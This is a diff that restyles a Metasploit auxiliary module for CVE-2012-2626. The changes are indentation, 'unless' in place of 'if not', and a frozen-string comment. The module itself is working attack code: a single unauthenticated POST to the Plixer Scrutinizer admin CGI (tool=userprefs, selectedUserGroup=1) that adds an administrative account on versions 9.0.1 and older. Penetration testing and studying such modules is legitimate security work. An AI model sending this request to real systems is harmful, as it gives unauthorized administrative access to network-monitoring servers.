@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,56 +7,53 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Plixer Scrutinizer NetFlow and sFlow Analyzer HTTP Authentication Bypass',
-      'Description'    => %q{
-        This will add an administrative account to Scrutinizer NetFlow and sFlow Analyzer
-        without any authentication.  Versions such as 9.0.1 or older are affected.
-      },
-      'References'     =>
-        [
-          [ 'CVE', '2012-2626' ],
-          [ 'OSVDB', '84318' ],
-          [ 'URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt' ]
-        ],
-      'Author'         =>
-        [
-          'MC',
-          'Jonathan Claudius',
-          'Tanya Secker',
-          'sinn3r'
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Jul 27 2012"
-    ))
+                      'Name'           => 'Plixer Scrutinizer NetFlow and sFlow Analyzer HTTP Authentication Bypass',
+                      'Description'    => %q(
+                        This will add an administrative account to Scrutinizer NetFlow and sFlow Analyzer
+                        without any authentication.  Versions such as 9.0.1 or older are affected.
+                      ),
+                      'References'     =>
+                        [
+                          [ 'CVE', '2012-2626' ],
+                          [ 'OSVDB', '84318' ],
+                          [ 'URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt' ]
+                        ],
+                      'Author'         =>
+                        [
+                          'MC',
+                          'Jonathan Claudius',
+                          'Tanya Secker',
+                          'sinn3r'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => "Jul 27 2012"))
 
     register_options(
       [
         OptString.new("TARGETURI", [true, 'The path to the admin CGI script', '/cgi-bin/admin.cgi']),
         OptString.new("USERNAME", [true, 'The username for your new account']),
         OptString.new("PASSWORD", [true, 'The password for your new account'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
     uri = normalize_uri(target_uri.path)
-    res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => uri,
-      'vars_post' => {
-        'tool'              => 'userprefs',
-        'newUser'           => datastore['USERNAME'],
-        'pwd'               => datastore['PASSWORD'],
-        'selectedUserGroup' => '1'
-      }
-    })
+    res = send_request_cgi('method' => 'POST',
+                           'uri'       => uri,
+                           'vars_post' => {
+                             'tool' => 'userprefs',
+                             'newUser'           => datastore['USERNAME'],
+                             'pwd'               => datastore['PASSWORD'],
+                             'selectedUserGroup' => '1'
+                           })
 
-    if not res
+    unless res
       print_error("No response from server")
       return
     end
@@ -84,5 +82,4 @@ class MetasploitModule < Msf::Auxiliary
       print_line(res.body)
     end
   end
-
 end
